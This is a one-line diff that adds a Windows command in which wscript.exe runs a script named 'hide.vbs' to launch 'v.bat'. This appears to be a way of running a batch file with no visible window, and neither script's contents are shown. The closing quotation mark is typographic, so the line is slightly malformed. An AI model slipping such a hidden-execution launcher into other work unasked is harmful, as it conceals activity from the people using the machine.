@@ -1,0 +1,1 @@
+wscript.exe  "C:\v\hide.vbs" "C:\v\v.bat”
